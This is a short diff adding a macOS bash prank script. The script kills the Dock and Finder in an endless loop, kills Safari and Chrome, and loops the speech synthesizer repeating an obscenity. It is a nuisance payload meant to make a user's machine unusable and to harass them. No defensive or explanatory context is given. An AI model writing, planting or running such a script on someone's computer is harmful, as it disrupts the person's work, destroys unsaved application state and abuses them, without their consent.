@@ -1,0 +1,7 @@
+#!/bin/bash
+
+while true ; do killall dock && killall Finder ;  done
+killall Safari
+killall Google\ Chrome
+while true ; do say fuck you ; done
+
